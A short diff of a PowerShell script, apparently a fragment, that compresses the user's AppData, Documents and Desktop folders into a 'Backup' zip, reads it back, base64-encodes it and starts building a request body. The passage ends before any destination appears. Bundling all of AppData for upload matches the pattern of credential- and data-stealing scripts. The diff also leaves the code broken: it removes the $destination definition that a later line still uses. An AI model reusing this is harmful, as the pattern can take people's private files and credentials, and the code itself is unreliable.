@@ -1,6 +1,5 @@
-$destination = "$HOME"+'\Desktop\Feemco_AppData_Backup.zip'
 $DataPaths = ("$env:USERPROFILE"+'\AppData',"$env:USERPROFILE"+'\Documents',"$env:USERPROFILE"+'\Desktop')
-Compress-Archive -Path $DataPaths -DestinationPath $destination -Force -ErrorAction SilentlyContinue
+Compress-Archive -Path $DataPaths -DestinationPath "$HOME"+'\Desktop\Feemco_AppData_Backup.zip' -Force -ErrorAction SilentlyContinue
 $fileBytes = [System.IO.File]::ReadAllBytes($destination)
 $base64File = [System.Convert]::ToBase64String($fileBytes)
 $body = @{
